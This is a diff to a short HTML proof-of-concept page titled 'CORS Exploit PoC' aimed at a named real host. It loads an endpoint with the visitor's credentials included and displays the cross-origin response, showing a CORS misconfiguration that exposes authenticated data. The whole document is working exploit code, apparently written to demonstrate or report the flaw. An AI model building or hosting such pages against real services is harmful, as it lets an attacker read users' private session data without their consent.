@@ -1,21 +1,16 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h2>CORS Response Output:</h2>
-<pre id="output" style="white-space: pre-wrap; border: 1px solid #000; padding: 10px;"></pre>
+<h1>CORS Exploit PoC – baryon.viator.com</h1>
 
 <script>
 fetch("https://baryon.viator.com/ha/chat/availability/SALES?locale=en", {
     credentials: "include"
 })
-.then(async resp => {
-    let text = await resp.text();
-    try {
-        let json = JSON.parse(text);
-        text = JSON.stringify(json, null, 4); // pretty print
-    } catch (e) {}
-    document.getElementById("output").textContent = text;
-});
+.then(r => r.text())
+.then(t => alert(t));
 </script>
+
+
 </body>
 </html>
